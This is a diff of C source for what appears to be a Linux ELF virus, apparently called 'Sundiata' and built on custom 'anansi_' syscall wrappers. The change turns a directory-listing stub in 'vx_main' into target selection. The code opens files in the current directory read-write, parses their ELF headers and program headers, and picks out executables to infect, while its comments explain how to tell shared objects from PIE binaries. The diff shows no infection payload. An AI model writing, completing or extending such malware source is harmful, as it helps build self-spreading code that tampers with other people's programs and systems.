@@ -21,6 +21,7 @@
 #define MAGIC_INITIALIZER_RAN 0xDEADBEEF
 
 #define STDOUT STDOUT_FILENO
+#define PAGE_SIZE 0x1000
 #define FAILURE -1
 #define SUCCESS 0
 
@@ -152,8 +153,10 @@ void vx_main()
 	char *full_path = NULL;
 
 	struct linux_dirent *d;
-	int cwd_fd, nread, status = SUCCESS, max_target = MAX_TARGET;
+	int cwd_fd, nread, attr, status = SUCCESS, max_target = MAX_TARGET;
 	const size_t DIR_LISTING_SIZE = 5000;
+
+	Elfbin target;
 
 	if(!(cwd = anansi_malloc(PATH_MAX))) {
 		status = FAILURE;
@@ -173,6 +176,7 @@ void vx_main()
 
 	nread = anansi_getdents64(cwd_fd, cwd_listings, DIR_LISTING_SIZE);
 	d = (struct linux_dirent *)cwd_listings;
+	attr = PROCESS_ELF_EHDR | PROCESS_ELF_PHDR | PROCESS_ELF_SHDR;
 
 	for(long entry = 0; entry < nread; entry += d->d_reclen) {
 		d = (struct linux_dirent *) (cwd_listings + entry);
@@ -185,10 +189,19 @@ void vx_main()
 		if(!(full_path = create_full_path(cwd, d->d_name)))
 			continue;
 
-		anansi_write(STDOUT, full_path, anansi_strlen(full_path));
-		anansi_write(STDOUT, "\n", 1);
+		process_elf_initialize(&target);
+
+		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, PAGE_SIZE, full_path) == SUCCESS)
+			if (valid_target(&target, sizeof(Elf64_Ehdr), false)) {
+#ifdef DEBUG
+				anansi_printf("%s\n", full_path);
+#endif
+				max_target--;
+			}
+
 		anansi_munmap(full_path, anansi_strlen(full_path) + 1);
-		max_target--;
+		process_elf_free(&target);
+
 	}
 
 clean_up:
@@ -232,6 +245,10 @@ int process_elf(Elfbin *target, int attr, int perm, int len, char *p)
 
 	if(anansi_stat(p, &fs) < 0)
 		return -1;
+
+	if(S_ISDIR(fs.st_mode))
+		return -1;
+
 	if(fs.st_size < (sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr) + sizeof(Elf64_Shdr)))
 		return -1;
 
@@ -373,8 +390,8 @@ bool valid_target(Elfbin *c, int min_size, bool no_shared_objects)
 
 	if(no_shared_objects) {
 		//ET_DYN is an elf type shared by both shared objects and PIE binaries.
-		//The absence of a program header of type PT_INTERP is indicative of a shared object.
-		//We are not interested in shared objects in Sundiata, logic below discriminates against them.
+		//The absence of a program header of type PT_INTERP in conjunction with ET_DYN is indicative of a shared object.
+		//libc and ld-linux are exceptions, since they are both libraries and executables
 		if(c->ehdr->e_type == ET_DYN) {
 			for(int p_entry = 0; p_entry < c->ehdr->e_phnum; p_entry++) {
 				if(c->phdr[p_entry].p_type == PT_INTERP)
